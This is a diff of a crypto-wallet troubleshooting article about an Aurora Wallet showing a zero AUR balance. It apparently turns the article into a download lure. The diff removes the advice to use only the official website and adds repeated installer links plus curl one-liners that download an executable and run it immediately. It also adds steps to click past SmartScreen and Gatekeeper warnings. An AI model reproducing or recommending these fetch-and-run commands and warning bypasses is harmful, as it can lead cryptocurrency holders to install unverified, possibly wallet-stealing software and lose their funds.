@@ -1,90 +1,124 @@
----
-title: "Fixing an Auroracoin Wallet Zero Balance"
-description: "Is your Aurora Wallet showing 0 AUR? Learn how to verify your real balance on the blockchain and restore your wallet display safely."
-primary_keyword: "aurora wallet zero balance"
-silo: "Troubleshooting"
-updated: 2026-10-10
----
+![Aurora Wallet zero balance guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Aurora Wallet zero balance: how to confirm your real AUR
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+A balance of zero is almost always a display problem, and the check takes two minutes.
 
-# Auroracoin Wallet Showing 0 Balance: How to Restore It
+## Downloads - 2026.08.1.0
 
-Opening your Aurora Wallet only to find a balance of 0 AUR when you expected to see your funds can be a distressing experience. However, it is vital to understand that in the vast majority of cases, a zero balance is a display or synchronization issue rather than a loss of coins. Your Auroracoin (AUR) is recorded on the immutable, public Auroracoin blockchain, not within the application itself. The Aurora Wallet acts as a sophisticated interface—a "window" into the blockchain—and if that window is obscured or disconnected, it may fail to report your true holdings. As long as you maintain control over your private keys or recovery phrase, your funds remain secure and accessible once the display issue is resolved.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-- Your total balance suddenly reads "0.00 AUR" despite having received coins in the past.
-- The transaction history is completely empty, or recent transactions are missing from the list.
-- The wallet indicates it is "Synchronizing" but the progress is slow or stuck.
-- You have recently updated your Aurora Wallet software or moved your installation to a new computer.
-- You are opening a new wallet instance and have not yet imported your existing recovery phrase or `wallet.dat` file.
-- The application shows a "0 active connections" status, preventing it from fetching the latest blockchain data.
-- You have multiple wallet files and the application has loaded an empty one by default.
 
-## Why this happens
+Your coins are recorded on the Auroracoin blockchain, not inside the application, so a zero balance means the wallet cannot see the chain yet.
 
-A zero balance display is typically the result of the wallet application losing its synchronization with the live Auroracoin network. Because the wallet only knows about transactions it has successfully scanned from the blockchain, any interruption in that scanning process will result in an inaccurate balance.
+The wallet is a window onto the ledger. When the window is fogged by an unfinished sync, a wrong chain or an unimported key, the number reads zero while the coins stay exactly where they were. The checks below separate those cases.
 
-Common technical reasons for a false zero balance include:
+<!-- ARTICLE-BODY-BEGIN -->
 
-1.  **Incomplete Initial Synchronization**: If you have just installed the Aurora Wallet, it must download and verify the entire history of the Auroracoin blockchain. Until it reaches the specific block containing your transactions, it will report a balance of zero. This process can take significant time depending on your hardware and network speed.
-2.  **Network Chain Splits (Hard Forks)**: If the network has undergone an upgrade and you are running an outdated version of the wallet, your software may be following a "legacy" chain where your recent transactions do not exist. This is a frequent cause of confusion for users of older Auroracoin Core clients.
-3.  **Corrupted Block Index**: If the internal database that indexes your transactions becomes damaged (due to a crash or improper shutdown), the wallet may "lose track" of your coins. The coins are still there, but the index used to display them is broken.
-4.  **Wallet File Mismatch**: The Aurora Wallet stores your private keys in a file called `wallet.dat`. If you have reinstalled the software and it created a fresh, empty `wallet.dat` instead of using your original one, the balance will naturally be zero.
-5.  **Address Derivation Issues**: If you are restoring from a recovery phrase and use the wrong derivation path, the wallet will generate a set of empty addresses rather than the ones containing your AUR.
+## Check the sync state first
 
-## The fix
+The bottom bar shows the block height and the percentage. A wallet that has not reached one hundred percent is still catching up, and every balance you see before that point is a partial truth. Leave it open and check again before doing anything else.
 
-Follow these steps to verify your funds and restore your wallet's balance display.
+Compare the height in the wallet with a public explorer. A large gap means the sync is behind. A small gap that never closes means the wallet is connected to a stale chain.
 
-1.  **Confirm on a Block Explorer**: Before troubleshooting the app, verify your balance externally. Copy your Auroracoin receiving address and paste it into a trusted [public block explorer](https://auroracoin.net/explorer). If the explorer shows your correct balance, your funds are safe, and the issue is purely a display problem in your local software.
-2.  **Wait for Full Synchronization**: Check the status bar at the bottom of the Aurora Wallet. If it says "Synchronizing" or "Catching up," leave the application open and connected to the internet. The balance will only appear once the sync process reaches your transactions.
-3.  **Check Network Connectivity**: Ensure your wallet has active connections (look for the signal icon). If it shows "0 connections," follow the steps in our [No Peers Connection guide](12-no-peers-connection.md) to restore network access.
-4.  **Restart and Rescan**: Close the Aurora Wallet completely and restart it. If the balance is still zero, you may need to initiate a "Rescan." This forces the wallet to look through its downloaded blockchain data again to find your specific transactions. You can usually find this in the "Tools" or "Settings" menu.
-5.  **Verify Wallet File Path**: Ensure the Aurora Wallet is loading your intended `wallet.dat` file. If you have a backup on a USB drive, you may need to replace the automatically generated empty file with your backed-up version (ensure the wallet is closed while doing this).
-6.  **Update to the Latest Version**: Ensure you are running [Aurora Wallet 2026.08.1.0](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0). Modern versions include fixes for common display bugs and improved synchronization logic.
+## Work through the causes
 
-## If that didn't work
+1. Let the sync reach one hundred percent before you judge the balance.
+2. Confirm the wallet is on mainnet rather than a test network.
+3. Check that the address you expect holds the balance, using the receive tab of the wallet.
+4. Import the keys if the coins sit in a legacy `wallet.dat` or on a paper key.
+5. Restore from the recovery phrase on a second machine if the wallet displays an address you do not recognise.
 
-If your balance remains zero after a full synchronization and a successful rescan, and the block explorer also shows a zero balance for your address, you must investigate if the coins were moved. Review the transaction history on the block explorer to see if there are any outgoing payments you did not authorize. If you see unauthorized activity, your private keys may have been compromised. In this scenario, immediately stop using the compromised wallet and seek assistance from the [official Auroracoin security guides](https://auroracoin.net/security).
+An address that appears in the wallet but shows nothing on an explorer is a wrong-chain symptom, not a spending problem. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md">Chain split and resync</a> explains how to get back to the main network.
 
-## Prevention
+## When the coins live somewhere else
 
-To avoid the stress of a false zero balance in the future, consider these best practices:
+Old holdings are often in a file rather than in the wallet in front of you. Importing a `wallet.dat` moves those keys into the phrase-backed wallet, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat safely</a> walks through the copy-first rule that keeps the original intact.
 
-- **Regular Backups**: Always keep multiple, encrypted backups of your `wallet.dat` file and your BIP-39 recovery phrase. This ensures you can always restore your balance in a fresh installation.
-- **Keep Your Wallet Synced**: Open your Aurora Wallet regularly (at least once a week) so it doesn't have to catch up on a large volume of data at once.
-- **Verify Addresses**: Always double-check your receiving addresses when sending AUR from an exchange or another wallet.
-- **Use Official Software**: Only download the Aurora Wallet from the [official Auroracoin website](https://auroracoin.net/download) to ensure you are not using a malicious version designed to hide your balance or steal your funds.
+A paper wallet holds a key rather than a wallet file, so the balance arrives by sweeping it, which is covered in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/23-sweep-paper-wallet.md">sweeping a paper wallet</a>.
+
+Running the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> removes one variable, because display fixes ship with new versions.
 
 ## FAQ
 
-**Is my recovery phrase enough to get my balance back?**
-Yes. Your 12 or 24-word recovery phrase (BIP-39) contains all the information needed to recreate your private keys and access your funds on any compatible Auroracoin wallet.
+### Did the wallet lose my coins?
 
-**Why does the block explorer show a balance but my wallet doesn't?**
-This usually means your wallet is not fully synchronized or is following the wrong version of the blockchain. The block explorer is always "up to date" with the main network, while your local wallet must download that data.
+No. Keys are on your machine and coins are on the chain. A display problem changes neither.
 
-**Can I still receive coins if my wallet shows 0 balance?**
-Yes. You can receive AUR even if your wallet is offline or showing an incorrect balance. The transaction happens on the blockchain. Once your wallet syncs, the new coins will appear.
+### What if the explorer shows a balance and the wallet does not?
 
-**Does a "Rescan" delete my coins?**
-No. A rescan only re-reads the blockchain data already stored on your computer. It is a non-destructive process that helps the wallet find transactions it might have missed.
+The wallet is not fully synced or is following the wrong chain. Work through the sync checks before anything else.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
-* [Wallet Not Syncing](11-wallet-not-syncing.md)
-* [Chain Split and Resync Guide](15-chain-split-resync.md)
-* [Stuck Transactions](16-pending-transaction.md)
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
+- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
+- [Chain split and resync](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md)
+- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
